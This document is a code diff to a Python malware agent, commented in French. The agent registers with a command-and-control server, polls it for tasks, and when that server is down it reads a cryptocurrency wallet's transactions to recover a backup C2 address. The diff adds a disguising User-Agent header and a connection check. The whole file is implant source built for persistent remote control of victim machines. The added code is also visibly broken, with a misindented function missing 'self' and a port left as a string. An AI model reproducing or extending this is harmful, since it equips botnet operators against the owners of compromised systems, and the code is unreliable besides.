@@ -24,12 +24,14 @@ class Agent:
             "key": self.key
         }
 
+        self.condition = {"User-Agent":"condition"}
+
     def register(self):
         """
         Enregistrer l'agent auprès du serveur C2.
         """
         regl = f"http://{self.ip}:{self.port}/register"
-        response = requests.post(regl, json=self.register_data)
+        response = requests.post(regl, json=self.register_data, headers=self.condition)
         if response.status_code == 200:
             self.name = response.text.strip()
             self.task_url = f"http://{self.ip}:{self.port}/getTask?agent={self.name}"
@@ -138,24 +140,41 @@ class Agent:
             i += 1
 
         return ip_address
-       
+
+    def tester_connexion_serveur(hote: str, port: int, timeout: float = 5.0) -> bool:
+    """
+    Tente de se connecter à un serveur donné sur un port spécifié.
+
+    :param hote: Adresse IP ou nom de domaine du serveur (ex: "google.com").
+    :param port: Port de connexion (ex: 80 pour HTTP).
+    :param timeout: Délai d’attente en secondes avant abandon (par défaut : 5.0s).
+    :return: True si la connexion est possible, False sinon.
+    """
+    try:
+        with socket.create_connection((hote, port), timeout=timeout):
+            return True
+    except (socket.timeout, socket.error):
+        return False
+   
 def main():
     WALLET = "CUSTOM_WALLET"
-    IP = "CUSTOM_IP"
-    PORT = "CUSTOM_PORT"
+    IP = "IP"
+    PORT = "PORT"
     KEY = "CUSTOM_KEY"
     NAME = "CUSTOM_NAME"
     hostname = os.uname()[1]
-    agent = Agent(hostname, IP, int(PORT), NAME, KEY)
+    agent = Agent(hostname, IP, PORT, NAME, KEY)
 
     # Enregistrer l'agent
     agent.register()
     while True:
-        signature_list = agent.retrieve_transaction(wallet_addr)
-        print(signature_list)
-        if signature_list != 0:
-            backup_ip = agent.retrieve_backup_ip(signature_list)
-            print(backup_ip)
+        is_up = tester_connexion_serveur(IP,PORT,10.0)
+        
+        if not is_up:
+            signature_list = agent.retrieve_transaction(wallet_addr)
+            if signature_list != 0:
+                backup_ip = agent.retrieve_backup_ip(signature_list)
+                agent.ip = backup_ip
 
         # Attendre et gérer les tâches
         agent.wait_for_task()
